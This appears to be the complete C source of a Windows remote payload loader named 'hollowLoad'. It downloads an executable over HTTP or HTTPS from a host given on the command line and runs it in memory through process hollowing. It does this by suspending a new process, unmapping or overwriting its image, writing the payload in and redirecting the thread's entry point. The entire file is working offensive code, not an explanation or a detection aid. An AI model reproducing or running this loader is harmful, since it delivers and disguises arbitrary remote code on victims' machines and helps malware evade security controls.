#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Ws2_32.lib")

typedef long int (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
NtUnmapViewOfSectionF NtUnmapViewOfSection;

char *argv0;

void
RunFromMemory(char* pImage, int argc, char *argv[])
{
	DWORD dwWritten = 0;
	DWORD dwHeader = 0;
	DWORD dwImageSize = 0;
	DWORD dwSectionCount = 0;
	DWORD dwSectionSize = 0;
	DWORD_PTR firstSection = 0;
	DWORD previousProtection = 0;
	DWORD jmpSize = 0;

	IMAGE_NT_HEADERS INH;
	IMAGE_DOS_HEADER IDH;
	IMAGE_SECTION_HEADER Sections[1000];

	PROCESS_INFORMATION peProcessInformation;
	STARTUPINFO peStartUpInformation;
	CONTEXT pContext;

	char* pMemory;
	char* pFile;
	char pPath[MAX_PATH];

	// Local Process to be Put in Memory and suspended (Same Exe Here)
	{
		char* lfMemory;
		int fSize;
		FILE* pLocalFile = fopen(argv0, "rb");
		if (pLocalFile == NULL) {
			printf("Failed to open file: %s\n", argv0);
			return;
		}
		printf("%s\n", argv0);
		fseek(pLocalFile, 0, SEEK_END);
		fSize = ftell(pLocalFile);
		rewind(pLocalFile);
		lfMemory = (char*)malloc(fSize);
		fread(lfMemory, 1, fSize, pLocalFile);
		fclose(pLocalFile);
		memcpy(&IDH, lfMemory, sizeof(IDH));
		memcpy(&INH, (void*)(lfMemory + IDH.e_lfanew), sizeof(INH));
		free(lfMemory);
	}
	// Just Grabbing Its ImageBase and SizeOfImage , Thats all we needed from the local process..
	DWORD_PTR localImageBase = INH.OptionalHeader.ImageBase;
	DWORD localImageSize = INH.OptionalHeader.SizeOfImage;

	memcpy(&IDH, pImage, sizeof(IDH));
	memcpy(&INH, (void*)(pImage + IDH.e_lfanew), sizeof(INH));

	dwImageSize = INH.OptionalHeader.SizeOfImage;
	pMemory = (char*)malloc(dwImageSize);
	memset(pMemory, 0, dwImageSize);
	pFile = pMemory;

	dwHeader = INH.OptionalHeader.SizeOfHeaders;
	firstSection = (DWORD_PTR)((pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
	memcpy(Sections, (char*)(firstSection), sizeof(IMAGE_SECTION_HEADER) * INH.FileHeader.NumberOfSections);

	memcpy(pFile, pImage, dwHeader);

	if ((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment) == 0)
		jmpSize = INH.OptionalHeader.SizeOfHeaders;
	else
	{
		jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
		jmpSize += 1;
		jmpSize *= INH.OptionalHeader.SectionAlignment;
	}

	pFile = (char*)(pFile + jmpSize);

	for (dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
	{
		jmpSize = 0;
		dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
		memcpy(pFile, (char*)(pImage + Sections[dwSectionCount].PointerToRawData), dwSectionSize);

		if ((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment) == 0)
			jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
		else
		{
			printf("going the scummy route\n");
			jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
			jmpSize += 1;
			jmpSize *= INH.OptionalHeader.SectionAlignment;
		}
		pFile = (char*)(pFile + jmpSize);
	}


	memset(&peStartUpInformation, 0, sizeof(STARTUPINFO));
	memset(&peProcessInformation, 0, sizeof(PROCESS_INFORMATION));
	memset(&pContext, 0, sizeof(CONTEXT));

	peStartUpInformation.cb = sizeof(peStartUpInformation);

	char buf[1024];
	sprintf(buf, "%s", argv0);
	for(int i=0;i<argc;i++)
		sprintf(buf, "%s %s", buf, argv[i]);

	int result = CreateProcess(NULL, buf, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &peStartUpInformation, &peProcessInformation);
	if (result)
	{
		pContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(peProcessInformation.hThread, &pContext);
		if (INH.OptionalHeader.ImageBase == localImageBase && INH.OptionalHeader.SizeOfImage <= localImageSize)
			VirtualProtectEx(peProcessInformation.hProcess, (LPVOID)(INH.OptionalHeader.ImageBase), dwImageSize, PAGE_EXECUTE_READWRITE, &previousProtection);
		else
		{
			NtUnmapViewOfSection(peProcessInformation.hProcess, (PVOID)(localImageBase));
			VirtualAllocEx(peProcessInformation.hProcess, (LPVOID)(INH.OptionalHeader.ImageBase), dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		}
		WriteProcessMemory(peProcessInformation.hProcess, (void*)(INH.OptionalHeader.ImageBase), pMemory, dwImageSize, &dwWritten);
#ifdef _WIN64
		WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Rbx + 8), &INH.OptionalHeader.ImageBase, 8, &dwWritten);
		pContext.Rax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
#else
		WriteProcessMemory(peProcessInformation.hProcess, (void*)(pContext.Ebx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten);
		pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
#endif
		SetThreadContext(peProcessInformation.hThread, &pContext);
		VirtualProtectEx(peProcessInformation.hProcess, (void*)(INH.OptionalHeader.ImageBase), dwImageSize, previousProtection, 0);
		ResumeThread(peProcessInformation.hThread);
	}
	else {
		printf("Could not create new proc: %u\n", GetLastError());
	}
	printf("waiting for child\n");
	WaitForSingleObject(peProcessInformation.hProcess, INFINITE);
	free(pMemory);
}

/* Fill buf with data from request, return new size of the buf */
void
readfromreq(char **buf, long iSize, HINTERNET con)
{
	DWORD gatesMagic;
	long toRead = 0;
	if (!WinHttpQueryDataAvailable(con, &toRead))
		printf("Error %u in checking bytes left\n", GetLastError());

	if(toRead == 0){
		printf("Read %d bytes\n", iSize);
		return;
	}

	printf("Current size: %d, To Read: %d\n", iSize, toRead);

	if(*buf == NULL){
		*buf = (char*)malloc(toRead+1);
		ZeroMemory(*buf, toRead+1);
	}else{
		*buf = (char*)realloc(*buf, iSize + toRead + 1);
		ZeroMemory(*buf+iSize, toRead + 1);
	}

	if (!WinHttpReadData(con, (LPVOID)(*buf+iSize), toRead, &gatesMagic)){
                printf( "Error %u in WinHttpReadData.\n", GetLastError());
	}

	readfromreq(buf, iSize+toRead, con);
}

char*
dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target)
{
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL,
			hConnect = NULL,
			hRequest = NULL;

	char *out = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"hollowLoad/1.0", 
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME, 
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect( hSession, addr, port, 0);
	else
		printf("Failed to create session\n");

	const char *mimes[] = {
		"application/octet-stream",
		NULL
	};

	// Create an HTTP Request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest( hConnect, L"GET", 
			target, 
			NULL, WINHTTP_NO_REFERER, 
			WINHTTP_DEFAULT_ACCEPT_TYPES, 
			WINHTTP_FLAG_SECURE);
	else{
		printf("Failed to connect to server\n");
	}

	// Send a Request.
	if (hRequest) 
		bResults = WinHttpSendRequest( hRequest, 
					WINHTTP_NO_ADDITIONAL_HEADERS,
					0, WINHTTP_NO_REQUEST_DATA, 0, 
					0, 0);
	else{
		printf("Failed to connect to server\n");
	}

	if (bResults)
		bResults = WinHttpReceiveResponse( hRequest, NULL);
	else
		printf("Error %d has occurred.\n",GetLastError());

	if(bResults){
		printf("About to fill buffer\n");
		readfromreq(&out, 0, hRequest);
	}else
		printf("Error %d has occurred.\n",GetLastError());

	// Close open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	printf("Done with Reading\n");

	return out;
}


/* SOCKET is a struct(?), 0 signifies error */
SOCKET
wsockinit(char *addr, char *port)
{
	WSADATA wsaData;
	int iResult;

	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 0;
	}

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	ZeroMemory( &hints, sizeof(hints) );
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(addr, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 0;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr=result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 0;
	}

	// Connect to server.
	iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
	    closesocket(ConnectSocket);
	    ConnectSocket = INVALID_SOCKET;
	}

	// Should really try the next address returned by getaddrinfo
	// if the connect call failed
	// But for this simple example we just free the resources
	// returned by getaddrinfo and print an error message

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	return ConnectSocket;
}


char*
readpayload(SOCKET s, char *target)
{
	const char reqtemp[] = "GET /%s HTTP/1.0\n\r\n\r";
	char *req = (char*)malloc(strlen(target) + sizeof(reqtemp)-2);
	int reqlen = sprintf(req, reqtemp, target);
	int result;

	int recvcount = 0;
	int size = 256;
	char *recvbuf = (char*)malloc(size);

	result = send(s, req, reqlen, 0);
	if(result == SOCKET_ERROR){
		printf("Send failed: %d\n", WSAGetLastError());
		closesocket(s);
		WSACleanup();
		return NULL;
	}
	shutdown(s, SD_SEND);

	do {
		result = recv(s, recvbuf+recvcount, size-recvcount, 0);
		if( result > 0){
			recvcount+=result;
			if(recvcount >  (size/2)){
				size = size * 2;
				recvbuf = (char*)realloc(recvbuf, size);
			}
		}
	} while( result > 0);

	//Strip HTTP Headers
	char *data = strstr(recvbuf, "\r\n\r\n");
	data+=4;
	return data;
}

void
usage(void)
{
	printf("Usage: %s http|https address port payload\n", argv0);
	exit(1);
}

int
main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	char *lpMemory = NULL;

	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection");

	argv0 = argv[0];
	if(argc < 5)
		usage();

	if(strcmp("https", argv[1]) == 0){
		size_t convertedChars = 0;
		size_t wideSize = strlen(argv[2]) + 1;
		wchar_t* addr = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
		mbstowcs_s(&convertedChars, addr, wideSize, argv[2], _TRUNCATE);

		wideSize = strlen(argv[4]) + 1;
		wchar_t* target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
		mbstowcs_s(&convertedChars, target, wideSize, argv[4], _TRUNCATE);
		printf("%ls %s %ls\n", addr, argv[2], target);
		lpMemory = dohttpreq(addr, atoi(argv[3]), target);
	}
	else if(strcmp("http", argv[1]) == 0){
		SOCKET s = wsockinit(argv[2], argv[3]);
		lpMemory = readpayload(s, argv[4]);
	}else{
		usage();
	}


	if(lpMemory != NULL){
		printf("Running...\n");
		RunFromMemory(lpMemory, 0, argv);
	}else
		printf("Could not read response\n");
	return 0;
}
